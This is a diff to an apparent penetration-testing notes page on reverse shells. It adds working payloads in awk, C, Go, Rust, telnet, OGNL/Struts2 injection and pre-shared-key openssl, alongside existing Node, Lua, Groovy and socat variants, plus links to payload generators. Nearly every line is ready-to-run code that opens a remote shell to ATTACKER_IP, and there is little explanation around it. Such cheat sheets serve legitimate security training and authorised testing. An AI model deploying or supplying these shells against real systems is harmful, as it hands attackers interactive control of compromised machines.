@@ -4,8 +4,8 @@ type: technique
 tags: [bind-shell, exploitation, php, post-exploitation, reverse-shell]
 phase: exploitation
 date_created: 2026-05-12
-date_updated: 2026-05-12
-sources: [cpts-shells-payloads, thm-linux-reverseproxy, git-htb-writeups]
+date_updated: 2026-09-03
+sources: [cpts-shells-payloads, thm-linux-reverseproxy, git-htb-writeups, InternalAllTheThings]
 ---
 
 ## What it is
@@ -137,6 +137,66 @@ require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&
 os.execute("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
 ```
 
+**Awk:**
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+**C (compile with `gcc shell.c -o csh && ./csh`):**
+```c
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    struct sockaddr_in a;
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    a.sin_family = AF_INET;
+    a.sin_port = htons(4444);
+    a.sin_addr.s_addr = inet_addr("ATTACKER_IP");
+    connect(s, (struct sockaddr *)&a, sizeof(a));
+    dup2(s, 0); dup2(s, 1); dup2(s, 2);
+    execve("/bin/sh", (char *const[]){"/bin/sh", NULL}, NULL);
+}
+```
+
+**Golang (compile-and-run one-liner):**
+```bash
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
+```
+
+**Rust (compile with `rustc shell.rs -o rsh && ./rsh`):**
+```rust
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+fn main() {
+    let s = TcpStream::connect("ATTACKER_IP:4444").unwrap();
+    let fd = s.as_raw_fd();
+    Command::new("/bin/sh").arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn().unwrap().wait().unwrap();
+}
+```
+
+**Telnet (two listeners, no nc on target):**
+```bash
+# Attacker: nc -lvp 8080  &&  nc -lvp 8081  (separate terminals)
+# Target:
+telnet ATTACKER_IP 8080 | /bin/sh | telnet ATTACKER_IP 8081
+```
+
+**OGNL (Struts2/OGNL injection sink):**
+```java
+(#a='echo <base64 of: bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' | base64 -d').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
+```
+
 **Groovy (Jenkins Script Console):**
 ```groovy
 String host="ATTACKER_IP";int port=4444;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
@@ -259,6 +319,19 @@ socat openssl-listen:443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 file:`tty`
 # Target
 socat openssl-connect:ATTACKER_IP:443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
 ```
+
+**TLS-PSK openssl (no PKI/cert needed, pre-shared key instead):**
+```bash
+openssl rand -hex 48   # generate a 384-bit PSK, reuse the value on both sides
+
+# Attacker
+openssl s_server -quiet -tls1_2 -cipher PSK-AES256-GCM-SHA384 -psk <PSK> -nocert -accept 443
+
+# Target
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -tls1_2 -psk <PSK> -connect ATTACKER_IP:443 > /tmp/s; rm /tmp/s
+```
+
+**Generators** (build the payload for you instead of hand-writing it): [revshells.com](https://www.revshells.com/) (hosted, per-language/encoding), [revshellgen](https://github.com/t0thkr1s/revshellgen) (CLI equivalent).
 
 ---
 
